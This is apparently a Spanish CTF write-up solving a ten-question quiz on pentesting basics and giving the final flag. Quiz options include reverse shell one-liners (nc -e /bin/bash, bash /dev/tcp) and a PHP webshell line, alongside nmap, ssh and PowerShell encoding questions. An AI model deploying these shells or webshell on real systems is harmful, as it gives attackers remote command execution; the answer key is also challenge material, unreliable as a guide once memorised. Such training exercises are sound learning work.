Consistía en resolver este test:
1. ¿Cuál de estas shells reversas funciona en Kali si estamos en escucha por el puerto tcp 5555  
	1. a. nc localhost 5555  
	2. b. nc -u 127.0.0.1 5555 -e /bin/bash 
	3. c. bash -c "bash -i >& /dev/tcp/127.0.0.1/5555 0>&1"  
	4. d. Todas las anteriores

2.  ¿Qué código PHP sirve para ejecutar comandos en una webshell con el parámetro cmd?  
	1. a.` <?php system($_GET['cmd']); ?>  `
	2. b. `<?php system($cmd); ?>  `
	3. c. `<?php $_GET['cmd'](); ?>`  
	4. d. Ninguna de las anteriores

3. ¿Qué comando te monta un servidor web local en el puerto 6666 de la carpeta en la que estás?  
	1. a. python3 -m SimpleHTTPServer 6666  
	2. b. python3 -m http.server 6666  
	3. c. nc -nvlp 6666 .  
	4. d. Ninguno

4.  ¿Qué opción de nmap permite escanear puertos SCTP?  
	1. a. -sY  
	2. b. -sT  
	3. c. -sU  
	4. d. Los puertos SCTP no existen

5.  ¿Qué parametro se utiliza para usar una clave pública (id_rsa) en el login de un ssh?  
	1. a. ssh -i id_rsa user@ip 
	2. b. ssh -p id_rsa user@ip  
	3. c. ssh -k id_rsa user@ip  
	4. d. ssh -oHostKeyAlgorithms=id_rsa user@ip

6.  ¿Qué comando codificado 'ls' es válido para ejecutar en un powershell (powershell -enc XXXXXX)  
	1. a. ls 
	2. b. bABzAAoA  
	3. c. bHM= 
	4. d. En powershell no funciona ls

7. ¿Qué comando de los siguientes se usa para realizar una transferencia de zona de un DNS?  
	1. a. dig zonetransfer.me TXT  
	2. b. dig @nsztm2.digi.ninja zonetransfer.me trzn  
	3. c. dig zonetransfer.me NS  
	4. d. dig @nsztm2.digi.ninja zonetransfer.me axfr

8. bf 51 75 e9 20 70 72 65 67 75 6e 74 61 20 65 73 20 65 73 74 61 3f  
	1. a. 1  
	2. b. 8  
	3. c. 31  
	4. d. 38

9. Juegan blancas y hacen mate en X movimientos: 
	1. a. 13
	2. b. 15
	3. c. 21
	4. d. 23 
![](../Imágenes/Pasted%20image%2020241106232816.png)


10.  ¿Cuál de estas flags está puesta para engañar a propósito  
	1. a. cibergal{cadababada}  
	2. b. cibergal{aaaaaaaaab}  
	3. c. cibergal{abcdabcdab}  
	4. d. cibergal{abacadabaa}

La mayoría de preguntas son de conocimientos pero algunas peculiares:
6 https://stackoverflow.com/questions/53269099/powershell-base64-encoding-required

```bash
iconv -f ASCII -t UTF-16LE ls |base64 -w 0
```

Escribiendo ls en un fichero y usando el comando:
![](../Imágenes/Pasted%20image%2020241106233039.png)

8 Está en hexadecimal, 
```bash
echo "bf 51 75 e9 20 70 72 65 67 75 6e 74 61 20 65 73 20 65 73 74 61 3f" | tr -d ' '  | base16 -d  
�Qu� pregunta es esta?  
```
La respuesta es la d porque 8 en hexadecimal es: 

```bash
echo -n "8" | base16                 
38
```

9 Hay webs que te encuentran los movimientos que deben hacer

10 Inspeccionando el html se ve una pista fake:
![](../Imágenes/Pasted%20image%2020241106233704.png)

En resumen: 
cibergal{cabaabddcd}